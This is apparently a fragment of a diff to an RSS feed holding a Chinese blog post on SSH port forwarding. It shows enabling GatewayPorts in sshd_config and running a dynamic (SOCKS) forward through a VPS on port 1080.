+&lt;p&gt;然后经过一番折腾，得出答案，需要修改 sshd 的配置文件&lt;code&gt;/etc/ssh/sshd_config&lt;/code&gt;,将配置做如下修改：&lt;/p&gt;
 &lt;pre tabindex="0"&gt;&lt;code class="language-config" data-lang="config"&gt;GatewayPorts yes
 &lt;/code&gt;&lt;/pre&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;#重启sshd服务&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;service sshd restart &lt;span style="color:#f92672"&gt;||&lt;/span&gt; systemctl restart sshd
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id="0x03-动态转发"&gt;0x03 动态转发
 &lt;/h2&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;ssh -qTfnN -D 0.0.0.0:1080 root@vps -p &lt;span style="color:#ae81ff"&gt;22&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;本机将本地1080端口的所有流量发给vps，vps转发收到的流量。这就是赤裸裸的socks代理啊。&lt;/p&gt;</description></item></channel></rss>
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;本机将本地 1080 端口的所有流量发给 vps，vps 转发收到的流量。这就是赤裸裸的 socks 代理啊。&lt;/p&gt;</description></item></channel></rss>
